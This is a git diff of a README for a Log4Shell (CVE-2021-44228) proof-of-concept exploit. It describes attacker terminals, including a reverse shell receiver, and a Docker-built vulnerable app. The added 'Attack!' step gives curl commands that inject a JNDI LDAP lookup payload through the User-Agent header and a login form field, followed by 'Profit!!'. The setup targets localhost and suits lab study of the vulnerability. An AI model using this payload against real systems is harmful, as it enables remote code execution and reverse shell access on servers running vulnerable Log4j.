@@ -1,13 +1,14 @@
 # log4j-shell-poc
 
 Cribbed from the great https://github.com/kozmer/log4j-shell-poc !!  
+![log4j-shell-poc](https://user-images.githubusercontent.com/4404271/157141049-9ce9dc50-5d8e-4794-84ca-7148825401e4.gif)
 
 
 A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
 
 #### Usage :
 
-You need 4 terminals, and 3 terminals and a web browser!  
+You need 4 terminals, or 3 terminals and a web browser!  
 They are as follows:  
 
 1) attacker terminal 1 of 3 (wow!): reverse shell cc reciever
@@ -46,6 +47,25 @@ Step 3) Our vulnerable application
 1: docker build -t log4j-shell-poc .
 2: docker run --network host log4j-shell-poc
 ```
+Step 4) Attack!  
+
+```c
+curl http://127.0.0.1:8080 -v  | grep session  
+<snip>  
+< HTTP/1.1 200 OK  
+< Server: Apache-Coyote/1.1  
+< Set-Cookie: JSESSIONID=2C4651F7F8F1FD3C73E544A7C5E3A600; Path=/; HttpOnly  
+< Content-Type: text/html;charset=ISO-8859-1  
+<snip>  
+curl -v -A "\${jndi:ldap://localhost:1389/a}" -X POST -d uname="\${jndi:ldap://localhost:1389/a}" --cookie JSESSIONID=2C4651F7F8F1FD3C73E544A7C5E3A600 http://127.0.0.1:8080/login  
+<snip>  
+>  
+* upload completely sent off: 37 out of 37 bytes  
+```  
+
+Step 5) Profit!!
+
+
 Once it is running, you can access it on localhost:8080
 
 Getting the Java version.
